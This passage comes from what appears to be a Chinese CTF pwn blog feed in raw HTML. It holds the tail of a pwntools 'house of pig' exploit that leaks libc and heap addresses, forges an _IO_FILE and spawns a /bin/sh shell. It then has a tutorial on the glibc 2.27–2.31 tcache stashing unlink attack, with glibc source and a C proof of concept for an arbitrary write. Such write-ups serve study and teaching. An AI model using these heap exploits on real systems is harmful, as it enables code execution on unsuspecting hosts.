class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Please enter the identity password of the corresponding user:&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> role == <span class="number">1</span>:</span><br><span class="line">        r.sendline(<span class="string">b&#x27;A\x01\x95\xc9\x1c&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> role == <span class="number">2</span>:</span><br><span class="line">        r.sendline(<span class="string">b&#x27;B\x01\x87\xc3\x19&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.sendline(<span class="string">b&#x27;C\x01\xf7\x3c\x32&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A7</span></span><br><span class="line">    delete(i+<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;The message is: &#x27;</span>)</span><br><span class="line">main_arena_96 = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena_96))</span><br><span class="line">malloc_hook = (main_arena_96 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + \</span><br><span class="line">    (libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] &amp; <span class="number">0xfff</span>)</span><br><span class="line">libc_base = malloc_hook-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;The message is: aaaaaaa\n&#x27;</span>)</span><br><span class="line">heap_base = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    create(<span class="number">0x90</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">3</span>)  <span class="comment"># B4</span></span><br><span class="line">    delete(i)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A8</span></span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A9</span></span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A10</span></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xb0</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">2</span>)  <span class="comment"># B5</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A11</span></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0xb0</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">2</span>)  <span class="comment"># B6</span></span><br><span class="line">create(<span class="number">0x410</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">21</span>)  <span class="comment"># B7</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A12</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x410</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">22</span>)  <span class="comment"># B8</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">10</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(heap_base+<span class="number">0x12c40</span>) +</span><br><span class="line">     p64(libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A13</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">create(<span class="number">0x420</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">22</span>)  <span class="comment"># B9</span></span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x150</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">7</span>)  <span class="comment"># A14</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x430</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">22</span>)  <span class="comment"># A15</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">9</span>, p64(<span class="number">0</span>)+p64(libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]-<span class="number">0x28</span>))</span><br><span class="line">change(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x430</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">22</span>)  <span class="comment"># A16</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">create(<span class="number">0x410</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">21</span>)  <span class="comment"># C0</span></span><br><span class="line"><span class="comment"># create(0x90, b&#x27;\n&#x27;*3)  # C1</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">9</span>, p64(heap_base+<span class="number">0x13680</span>)*<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">8</span>, p64(heap_base+<span class="number">0x13c00</span>)*<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">9</span>, p64(<span class="number">0</span>)+p64(libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]-<span class="number">0x20</span>))</span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">0x430</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">22</span>)  <span class="comment"># C1</span></span><br><span class="line">create(<span class="number">0x440</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">22</span>)  <span class="comment"># C2</span></span><br><span class="line">change(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">9</span>, p64(heap_base+<span class="number">0x13680</span>)*<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">8</span>, p64(heap_base+<span class="number">0x13c00</span>)*<span class="number">2</span>)</span><br><span class="line">change(<span class="number">3</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>+p64(heap_base+<span class="number">0x13c00</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x158</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">create(<span class="number">0x410</span>, payload)  <span class="comment"># C3</span></span><br><span class="line">create(<span class="number">0x90</span>, <span class="string">b&#x27;\n&#x27;</span>*<span class="number">2</span>)  <span class="comment"># C4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file</span>(<span class="params">_IO_write_base=<span class="number">0</span>, _IO_write_ptr=<span class="number">0</span>, _IO_buf_base=<span class="number">0</span>, _IO_buf_end=<span class="number">0</span>, vtable=<span class="number">0</span></span>):</span></span><br><span class="line">    IO_FILE = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0</span>) + \</span><br><span class="line">        p64(_IO_write_base)+p64(_IO_write_ptr) + \</span><br><span class="line">        p64(<span class="number">0</span>)+p64(_IO_buf_base)+p64(_IO_buf_end)</span><br><span class="line">    IO_FILE = IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    IO_FILE += p32(<span class="number">0</span>)</span><br><span class="line">    IO_FILE = IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>)+p64(vtable)</span><br><span class="line">    <span class="keyword">return</span> IO_FILE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;Gift:&quot;</span>)</span><br><span class="line">_IO_str_jumps = libc_base+<span class="number">0x1ed560</span></span><br><span class="line">system_addr = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">file_struct = pack_file(<span class="number">1</span>, <span class="number">0xffffffffffff</span>, heap_base +</span><br><span class="line">                        <span class="number">0x13c00</span>+<span class="number">0xe0</span>, heap_base+<span class="number">0x13c00</span>+<span class="number">0xe0</span>+<span class="number">0x18</span>, _IO_str_jumps)</span><br><span class="line">file_struct += <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(system_addr)*<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(file_struct[<span class="number">0x10</span>:])))</span><br><span class="line">r.sendline(file_struct[<span class="number">0x10</span>:])</span><br><span class="line"></span><br><span class="line">gdb.attach(r)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Choice:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><hr><h2 id="附件链接："><a href="#附件链接：" class="headerlink" title="附件链接："></a>附件链接：</h2><p><a class="link"   href="https://github.com/01dwang/house_of_pig" >https://github.com/01dwang/house_of_pig<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在最近做题的过程中发现自己的逆向能力很是欠缺，在梳理程序的逻辑的时候总是会梳理不清，尤其是程序当中存在复杂的结构体时或则存在cpp代码时，脑子就像有浆糊一样，后续会针对自己的逆向能力下手多练习相关题目。&lt;/p&gt;
&lt;h2 id=&quot;ida恢复跳表&quot;&gt;&lt;a href=&quot;#ida恢</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="house of pig" scheme="https://cv196082.gitee.io/tags/house-of-pig/"/>
    
    <category term="house系列" scheme="https://cv196082.gitee.io/tags/house%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
  <entry>
    <title>tcache stashing unlink attack</title>
    <link href="https://cv196082.gitee.io/2022/02/24/tcache-stashing-unlink-attack/"/>
    <id>https://cv196082.gitee.io/2022/02/24/tcache-stashing-unlink-attack/</id>
    <published>2022-02-24T09:19:50.000Z</published>
    <updated>2022-02-28T09:10:22.803Z</updated>
    
    <content type="html"><![CDATA[<p>tcache stashing unlink attack作为house of pig的基础，所在这一篇更新完了就会跟新house of pig以及SROP。</p><p>首先，这种利用方式需要的条件就是存在calloc来申请chunk。</p><h2 id="在Glibc2-27以及到Glibc2-31下的tcache-stashing-unlink-attack"><a href="#在Glibc2-27以及到Glibc2-31下的tcache-stashing-unlink-attack" class="headerlink" title="在Glibc2.27以及到Glibc2.31下的tcache stashing unlink attack"></a>在Glibc2.27以及到Glibc2.31下的tcache stashing unlink attack</h2><p>先看一下源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在源码的注释也写上了，当tcache没有满，其他bin没有空的情况下就会把其他bin当中的chunk put进tcache内，并且这一阶段是没有任何保护的。根据昨天的largebin attack可以很清楚的看出来，这两行代码是有问题的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure><p>接下来就用heap exploit2.31当中的poc来做演示(这个poc的方式很巧妙)。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> victim = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *t1;</span><br><span class="line"><span class="keyword">char</span> *s1, *s2, *pad;</span><br><span class="line"><span class="keyword">char</span> *tmp;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;You can use this technique to write a big number to arbitrary address instead of unsortedbin attack\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n1. need to know heap address and the victim address that you need to attack\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">tmp = <span class="built_in">malloc</span>(<span class="number">0x1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;victim&#x27;s address: %p, victim&#x27;s vaule: 0x%lx\n&quot;</span>, &amp;victim, victim);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;heap address: %p\n&quot;</span>, tmp<span class="number">-0x260</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n2. choose a stable size and free six identical size chunks to tcache_entry list\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Here, I choose the size 0x60\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">t1 = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x50</span>);</span><br><span class="line"><span class="built_in">free</span>(t1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n&quot;</span>, </span><br><span class="line">t1, t1<span class="number">-0x60</span>, t1<span class="number">-0x60</span>*<span class="number">2</span>, t1<span class="number">-0x60</span>*<span class="number">3</span>, t1<span class="number">-0x60</span>*<span class="number">4</span>, t1<span class="number">-0x60</span>*<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n3. free two chunk with the same size like tcache_entry into the corresponding smallbin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">s1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Alloc a chunk %p, whose size is beyond tcache size threshold\n&quot;</span>, s1);</span><br><span class="line">pad = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Alloc a padding chunk, avoid %p to merge to top chunk\n&quot;</span>, s1);</span><br><span class="line"><span class="built_in">free</span>(s1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Free chunk %p to unsortedbin\n&quot;</span>, s1);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x3c0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;</span>, s1+<span class="number">0x3c0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Repeat the above steps, and free another chunk into corresponding smallbin\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n&quot;</span>);</span><br><span class="line">s2 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">pad = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">free</span>(s2);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x3c0</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;chunk %p is in smallbin[4], whose size is 0x60\n&quot;</span>, s2+<span class="number">0x3c0</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;smallbin[4] list is %p &lt;--&gt; %p\n&quot;</span>, s2+<span class="number">0x3c0</span>, s1+<span class="number">0x3c0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n4. overwrite the first chunk in smallbin[4]&#x27;s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Change %p&#x27;s bk pointer to &amp;victim-0x10 address: 0x%lx\n&quot;</span>, s2+<span class="number">0x3c0</span>, (<span class="keyword">uint64_t</span>)(&amp;victim)<span class="number">-0x10</span>);</span><br><span class="line">*(<span class="keyword">uint64_t</span>*)((s2+<span class="number">0x3c0</span>)+<span class="number">0x18</span>) = (<span class="keyword">uint64_t</span>)(&amp;victim)<span class="number">-0x10</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n5. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x50</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Finally, the victim&#x27;s value is changed to a big number\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now, victim&#x27;s value: 0x%lx\n&quot;</span>, victim);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先在这里放入六个chunk到tcache内</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">    t1 = <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x50</span>);</span><br><span class="line">    <span class="built_in">free</span>(t1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220224163011096.png" alt="image-20220224163011096"></p><p>下面几步是将一个size为0x60的chunk放入smallbins当中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">pad = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(s1);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x3c0</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220224163104779.png" alt="image-20220224163104779"></p><p>下面进行相同操作把chunk放入smallbin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s2 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">pad = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">free</span>(s2);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x3c0</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220224163256971.png" alt="image-20220224163256971"></p><p>接着修改后一个chunk的bk指针为target-0x10</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="keyword">uint64_t</span>*)((s2+<span class="number">0x3c0</span>)+<span class="number">0x18</span>) = (<span class="keyword">uint64_t</span>)(&amp;victim)<span class="number">-0x10</span>;</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220224163837757.png" alt="image-20220224163837757"></p><p>随后用calloc申请一个smallbin当中的chunk让另一个进入tcache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0x50</span>);</span><br></pre></td></tr></table></figure><p><img src="/images/image-20220224164257661.png" alt="image-20220224164257661"></p><p>可以看到目标地址的值被改变了并且我们最后一个chunk也进入的tcache</p><h3 id="进一步分析"><a href="#进一步分析" class="headerlink" title="进一步分析"></a>进一步分析</h3><p>以上就是这个漏洞的利用方式之一，和昨天的largebin attack类似，但是这个漏洞存在一个更具有破坏性的利用方式，注意上面的两行代码当中有一行是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin-&gt;bk = bck;</span><br></pre></td></tr></table></figure><p>这样就导致了我们的smallbin的bk发生了改变</p><p><img src="/images/image-20220224165952567.png" alt="image-20220224165952567"></p><p>再看在glibc当中的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> last(b)      ((b)-&gt;bk)</span></span><br></pre></td></tr></table></figure><p>所以这也就导致了更具有破坏性的漏洞，我们可以任意地址申请堆块，并且可以看到tcache_put也是没有任何保护</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span 